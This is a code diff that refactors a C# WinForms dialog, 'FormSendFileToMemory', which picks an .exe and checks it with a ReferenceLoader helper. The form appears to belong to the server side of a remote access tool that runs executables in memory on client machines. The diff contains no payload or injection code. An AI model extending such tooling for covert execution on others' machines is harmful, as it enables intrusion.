@@ -1,21 +1,15 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
 using System.Drawing;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using System.Windows.Forms;
 using System.IO;
-using System.Reflection;
+using System.Windows.Forms;
 using Server.Helper;
 
 namespace Server
 {
     public partial class FormSendFileToMemory : Form
     {
-        public bool IsOK = false;
+        public bool IsOK;
+
         public FormSendFileToMemory()
         {
             InitializeComponent();
@@ -39,13 +33,12 @@ namespace Server
                     label3.Visible = true;
                     comboBox2.Visible = true;
                     break;
-
             }
         }
 
         private void button1_Click(object sender, EventArgs e)
         {
-            using (OpenFileDialog O = new OpenFileDialog())
+            using (var O = new OpenFileDialog())
             {
                 O.Filter = "(*.exe)|*.exe";
                 if (O.ShowDialog() == DialogResult.OK)
@@ -55,7 +48,6 @@ namespace Server
                     toolStripStatusLabel1.ForeColor = Color.Green;
                     IsOK = true;
                     if (comboBox1.SelectedIndex == 0)
-                    {
                         try
                         {
                             new ReferenceLoader().AppDomainSetup(O.FileName);
@@ -67,7 +59,6 @@ namespace Server
                             toolStripStatusLabel1.Text += " Invalid!";
                             IsOK = false;
                         }
-                    }
                 }
                 else
                 {
@@ -81,13 +72,13 @@ namespace Server
         private void button2_Click(object sender, EventArgs e)
         {
             if (IsOK)
-                this.Hide();
+                Hide();
         }
 
         private void Button3_Click(object sender, EventArgs e)
         {
             IsOK = false;
-            this.Hide();
+            Hide();
         }
     }
 }
